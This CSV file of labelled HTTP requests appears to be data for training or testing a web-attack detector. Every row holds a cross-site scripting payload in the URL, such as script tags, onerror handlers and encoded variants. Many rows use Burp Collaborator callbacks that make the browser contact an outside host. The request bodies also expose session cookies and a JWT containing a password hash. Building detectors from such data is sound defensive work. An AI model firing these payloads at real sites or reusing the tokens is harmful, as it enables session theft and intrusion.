id,method,user_agent,url,refer,body,lable
712,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E,,"GET /?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1 Cookie: JSESSIONID=3E8669D000C130677C27444D7E78FF71 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.163 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
2754,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/cms/info.php?mod=list%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
3986,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/changepwd.cgi?username=<script>alert(102);</script>&username=,,,5
35,GET,python-requests/2.18.4,/index.php?c=waterfall&wid=aa965c8464798100c6d01ba4e60b98ad&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&srcg=gaia_ios&src=gaia_ios_sug&q=%e6%94%af%e4%bb%98%e5%ae%9d%e8%ba%ab%e4%bb%bd%e4%bf%a1%e6%81%af%e6%80%8e%e4%b9%88%e4%bf%ae%e6%94%b9%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
360,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/quarantine/juicy_malware_linux_amd_64.url?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fbzetdvn9rixt6gj276dflis62x8rwit6lx9rwhk6X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/quarantine/juicy_malware_linux_amd_64.url?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fbzetdvn9rixt6gj276dflis62x8rwit6lx9rwhk6X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
684,GET,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",/jira/secure/BrowseProject.jspa?id=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e,,"GET /jira/secure/BrowseProject.jspa?id=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e HTTP/1.1 Host: 118.212.233.250:7005 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ",5
108,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/yikgwi6wa5ggp32pqtw245btlkrffg38uwrjh76X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/quarantine/juicy_malware_linux_arm_64.url,http://121.4.111.58:3000/ftp/quarantine,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/yikgwi6wa5ggp32pqtw245btlkrffg38uwrjh76X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/quarantine/juicy_malware_linux_arm_64.url HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
773,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/v3/js/bootstrap.min.js""%3C%69%6D%67%3C%21%2D%2D%20%2D%2D%3E%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%39%32%35%36%29%3B%2F%2F%3E%3C%21%2D%2D%20%2D%2D%3E",http://114.251.10.253/,"GET /v3/js/bootstrap.min.js""%3C%69%6D%67%3C%21%2D%2D%20%2D%2D%3E%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%39%32%35%36%29%3B%2F%2F%3E%3C%21%2D%2D%20%2D%2D%3E HTTP/1.1 Referer: http://114.251.10.253/ Cookie: jwplayer.mute=false;jwplayer.volume=NaN Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.253 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
952,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/url?hl=%3C%2FBoDY%3E%3CImg+id%3D%27GnPLueHK%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CboDY%3E&pref=%3C%2FboDY%3E%3CimG+id%3D%27lrKqRFIB%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbODy%3E&pval=%3C%2FBoDY%3E%3CImG+id%3D%27JcMXvzDH%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDy%3E&q=PgZIv%3CPgZIv%3EPgZIv%27PgZIv%22PgZIv%2FPgZIv-PgZIv&sa=p&usg=AOvVaw2KCzDBcDMRbzm2TqI3NYpG&ust=1658985708996093,,,5
743,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",/Apps/?%5Cu0022onmouseover='a7NN(9144)'bad=%5Cu0022,http://114.251.10.38/,"GET /Frame/NeedLogon.aspx?ReturnUrl=/Apps/%3FP4iV%3Da7NN([!%252B!])Ggs%3D HTTP/1.1 Referer: http://114.251.10.38/Apps/?""P4iV='a7NN([!%2B!])'Ggs="" Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive Cookie: ASP.NET_SessionId=psix5uiy5b0gxfuxsedubehw;APPKIZUSERNAME=DExWtSbs Host: 114.251.10.38  GET /Apps/?%5Cu0022onmouseover='a7NN(9144)'bad=%5Cu0022 HTTP/1.1 Referer: http://114.251.10.38/ Cookie: ASP.NET_SessionId=psix5uiy5b0gxfuxsedubehw;APPKIZUSERNAME=DExWtSbs Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.38 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
567,GET,python-requests/2.18.4,/Activity/edit?id=31?title=%E6%98%8E%E6%98%9F%E6%9D%A5%E4%BA%86&start_time=2016-08-04+00%3A00%3A00&url=http://www.hacker.org/&is_popup=0&detail=%3Cp%3E%40%E7%94%9F%E7%82%AC%26nbsp%3B%40%E6%95%AC%E5%AE%89%3C%2Fp%3E%3Cp%3E%3Cb%3E%E6%8A%80%E6%9C%AF%E9%9C%80%E6%B1%82%EF%BC%9A%3C%2Fb%3E%3C%2Fp%3E%3Cp%3E1%E3%80%81%26nbsp%3B%E7%82%B9%E5%87%BB%E5%A4%B4%E5%83%8F%E6%A1%86%E8%B7%B3%E8%BD%AC%E5%88%B0%E4%B8%AA%E4%BA%BA%E4%B8%BB%E9%A1%B5%3C%2Fp%3E%3Cp%3E2%E3%80%81%26nbsp%3B%E5%85%B3%E6%B3%A8%E4%B8%BB%E6%92%AD%3C%2Fp%3E%3Cp%3E3%E3%80%81%26nbsp%3B%E5%81%9A%E6%88%90%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AE%EF%BC%8C8%E6%9C%88%E4%BB%BD%E6%AF%8F%E4%B8%A4%E5%A4%A9%E6%9B%B4%E6%96%B0%E4%B8%80%E6%AC%A1%3C%2Fp%3E%3Cp%3E4%E3%80%81%26nbsp%3B%E5%88%86%E4%BA%AB%E6%96%87%E6%A1%88%EF%BC%9A%E6%98%8E%E6%98%9F%E6%9D%A5%E4%BA%86%EF%BC%8C%E4%BD%A0%E5%87%86%E5%A4%87%E5%A5%BD%E4%BA%86%E5%90%97%3C%2Fp%3E%3Cp%3E%E5%88%86%E4%BA%AB%E6%A0%87%E9%A2%98%EF%BC%9A%E4%B8%8A%E8%8A%B1%E6%A4%92%E7%9C%8B%E6%98%8E%E6%98%9F%E4%B8%8E%E6%9A%91%E5%81%87%E6%9B%B4%E9%85%8D%E5&image=88888&end_time=88888%3Cscript%3Ealert(42873)%3C/script%3E,,,5
3573,GET,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",/pan/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
211,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/MaterialIcons-Regular.woff2?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fu61ckeusy14cdzqlepkys1zp9gf930rsigc32rrX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/styles.css,"GET /MaterialIcons-Regular.woff2?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fu61ckeusy14cdzqlepkys1zp9gf930rsigc32rrX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Origin: http://121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: */* Referer: http://121.4.111.58:3000/styles.css Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv Connection: close  ",5
265,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/announcement_encrypted.md?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f9hrrvt579gfroe10p4vd3ga4kvqqeh951wpqcg05X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp,"GET /ftp/announcement_encrypted.md?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f9hrrvt579gfroe10p4vd3ga4kvqqeh951wpqcg05X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
164,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/qxr8balopxv84vhh5lbujxql0c66uyiq9e61wplX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/incident-support.kdbx,http://121.4.111.58:3000/ftp/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/qxr8balopxv84vhh5lbujxql0c66uyiq9e61wplX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/incident-support.kdbx HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
23,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/0stk8en62mcumatdd8o9lnh9006tukk8cz0wnmbbX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/quarantine/juicy_malware_linux_amd_64.url,http://121.4.111.58:3000/ftp/quarantine,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/0stk8en62mcumatdd8o9lnh9006tukk8cz0wnmbbX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/quarantine/juicy_malware_linux_amd_64.url HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
62,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/acquisitions.md?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fwxx6w8e84x0cau7ekb9dgq00orulim6ex2rphd6X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp,"GET /ftp/acquisitions.md?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fwxx6w8e84x0cau7ekb9dgq00orulim6ex2rphd6X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
4237,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/ajax-random-post/js.php?interval=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
36,GET,python-requests/2.18.4,/index.php?c=waterfall&gaia_app=1&ls=ucpp&q=%e6%89%8b%e6%9c%ba%e5%8d%95%e6%9c%ba%e6%b8%b8%e6%88%8f+&srcg=gaia_app&userid=4063f84f93d56dbf78857c1cc2a5b3e5&a=index&c=waterfall&category=internal&gaia_app=1&ls=ucpp&q=%e6%89%8b%e6%9c%ba%e5%8d%95%e6%9c%ba%e6%b8%b8%e6%88%8f+&src=gaia_app_result_sug&srcg=gaia_app&userid=4063f84f93d56dbf78857c1cc2a5b3e5&version=2.0.2.1002&channel=ucpp&src=gaia_app_result_sug&category=internal&version=2.0.2.1002&channel=ucpp?%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
720,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/manager/html;<img/src="">""%20onerror=alert(9144)>",http://114.251.10.47/,"GET /servlet/HitCount HTTP/1.1 Range: bytes=0-99999 Cookie: JSESSIONID=D9F9868E2707115B890F8DE2C36EB2E6 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.47 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
4298,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,,,5
1728,GET,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",/pan/wp-content/plugins/hdw-tube/playlist.php?playlist=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
169,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/order_53f7-c649066b047df5f5.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fjk71y38hcqi1ro4aseyn6qden5tzhu5mwaqxgl5X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp/,"GET /ftp/order_53f7-c649066b047df5f5.pdf?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fjk71y38hcqi1ro4aseyn6qden5tzhu5mwaqxgl5X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
3657,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/2m9wwi9l.x?<script>cross_site_scripting.nasl</script>,,,5
784,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/f/list'""()&%25<acx><ScRiPt%20>CXpS(9593)<%2fScRiPt>-2eedc898b05544cba8ee2a15bf8965e6.html",http://114.251.10.80/,"GET /f/list'""()&%25<acx><ScRiPt%20>CXpS(9593)<%2fScRiPt>-2eedc898b05544cba8ee2a15bf8965e6.html HTTP/1.1 Referer: http://114.251.10.80/ Cookie: JSESSIONID=2956A011E5AFB1FA7B33D6DE630C3642;eiaweb.session.id=9d04a2977ad64085bc5c06d09c402de4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.80 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
331,GET,python-requests/2.18.4,/searchthrow/api/ads/throw?ls=s01a16e7b78&w=400&h=90&inject=1&pos=0&rurl=http%3A%2F%2Fwww.1yyz10.com%2Fyyztest%2Fpage1.html&ref=88888&ifr=0&pn=0&prt=1470033328815&tit=%E5%B9%BF%E5%91%8A%E6%A0%B7%E5%BC%8F%E5%B1%95%E7%8E%B0&cw=1936&dpr=1&jv=1437124819535&inlay=0&link=13&rank=9&imagelink=4&searchlink=3&imagetext=0%2C0&pt=1470033328810%3C/script%3E%3Cscript%3Ealert(42873)%3C/script%3E,,,5
420,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/rest/user/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/3qul4ne1iaolx8auyy47cajytpzin9oxgo4fw2mqbX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/,"GET /rest/user/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/3qul4ne1iaolx8auyy47cajytpzin9oxgo4fw2mqbX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept: application/json, text/plain, */* Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_st",5
